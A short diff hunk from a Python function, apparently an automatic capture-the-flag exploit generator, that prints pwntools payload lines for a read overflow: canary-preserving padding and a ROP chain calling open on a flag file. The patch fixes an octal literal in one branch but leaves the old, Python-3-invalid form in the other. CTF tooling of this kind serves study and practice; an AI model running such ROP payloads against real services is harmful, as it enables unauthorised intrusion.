@@ -585,7 +585,7 @@ def solve_read_overflow(
                         print("r.send('flag\x00/')")
                         if elf.canary:
                             print(("payload3=b'a'*" + hex(rsi - 8) +
-                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
+                                  "+p64(canary)+b'a'*8+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0o664)+p64(0)+p64(the_open)"))
                         else:
                             print(("payload3=b'a'*" + hex(rsi + 8) +
                                   "+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
